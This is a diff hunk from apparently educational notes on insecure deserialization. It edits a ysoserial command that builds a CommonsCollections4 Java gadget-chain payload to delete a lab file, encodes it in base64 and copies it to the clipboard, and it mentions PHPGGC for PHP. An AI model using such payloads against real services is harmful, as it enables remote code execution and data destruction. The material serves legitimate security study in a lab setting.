@@ -84,7 +84,7 @@ Detecting gadget chain is very hard process. SOmetimes we could be able to use p
 ## Java gadget chain
 Java 16+ needs additional arguments to run ysoserial. To create ready exploit, encoded into base64, without spaces, we can use
 ```
-java -jar --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 | sed ':a;N;$!ba;s/\n/ /g;s/ //g' | xclip -selection clipboard
+java -jar --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w0 | xclip -selection clipboard
 ```
 ## PHP gadget chain
 For PHP we can use "PHP Generic Gadget Chains" (PHPGGC)  
